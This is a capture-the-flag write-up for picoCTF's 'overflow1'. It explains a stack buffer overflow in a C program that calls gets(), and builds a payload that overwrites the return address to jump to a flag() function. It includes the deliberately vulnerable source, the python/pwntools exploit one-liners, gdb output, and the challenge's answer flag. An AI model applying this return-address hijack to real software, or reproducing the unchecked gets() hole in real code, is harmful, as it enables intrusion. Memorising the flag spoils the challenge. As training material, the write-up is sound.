# overflow1

## Problem

You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a on the shell server.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

## Solution

Let's focus on the `vuln` function

```
#define BUFFSIZE 64
.
.
.
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}
```

It looks like the buffer size is meant to be 64, but `gets` doesn't verify the input length before happily copying
across. This time our goal is to over write out cap, and put the funciton address of the flag onto the stack in
the "return addess."

Let's take a quick look at what the stack might look like:

```
    +---------------+
    | old ebp       | <-- ebp
    +---------------+
    | ret           | <-- ebp + 0x4 (Return address for when "return" is called. This is our target)
    +---------------+
    | 0xdff83990    | <-- ebp + 0x8 (more stuff.....)
    +---------------+
```

Let's start by attempting to segfault the program with a nonsense buffer value. Input is coming in via keyboard with
this program, not command line arguments. So we need to change up how we pass in the exploit data. We will pipe it
in via standard input, instead:

```
python -c "print 'B'*64" | ./vuln
python -c "print 'B'*64 + 'B'*10 + 'A'*4" | ./vuln
python -c "print 'B'*64 + 'B'*12 + 'A'*4" | ./vuln
```

This vulnerable program is very helpful, and shows us the return address to help ensure we are doing things correctly.
From the output, we get to see the return address on the stack. Each run above shows when it begins to change. 12
bytes beyond our buffer appears to be the magic length to get our return address filled with A's (0x41414141). This is
what we see with the final execution above:

```
Give me a string and lets see what happens:
Woah, were jumping to 0x41414141 !
Segmentation fault (core dumped)
```

GREAT! Now, we need to dig a little deeper and figure out what the function address is for `void flag()`. If we can hijack the
return address so that vuln pops back to `flag()`, we'll win! To find the desired return address, we'll turn to
the `gdb` tool. With it, we can disassemble the compiled binary to see where the `flag` function resides.

```
gdb vuln

> diasm flag
```

We'll get a whole pile of disassembled assembly language code, which may or may not be a cipher unto itself to you. The
important thing is that since we disassembled the `flag` function specifically, it is that first line's hex address that
we want.

```
Dump of assembler code for function flag:
   0x080485e6 <+0>:     push   ebp
   0x080485e7 <+1>:     mov    ebp,esp
   0x080485e9 <+3>:     push   ebx
   0x080485ea <+4>:     sub    esp,0x54
   0x080485ed <+7>:     call   0x8048520 <__x86.get_pc_thunk.bx>
   0x080485f2 <+12>:    add    ebx,0x1a0e
   .
   .
   .
```

Flag func call address = `0x080485e6`

Let's replace the `'A'*4` part of our python code with the function return addess, and see what it does. One point to note:
numbers are stored in little endian (reversed byte direction) in this architecture, so we call `p32(0x080485e6)` using
pwntools to format the hex in little endian for us.

```
python -c "from pwn import *; print 'B'*64 + 'B'*12 + p32(0x080485e6)" | ./vuln
```

Success!

**Flag: picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}**
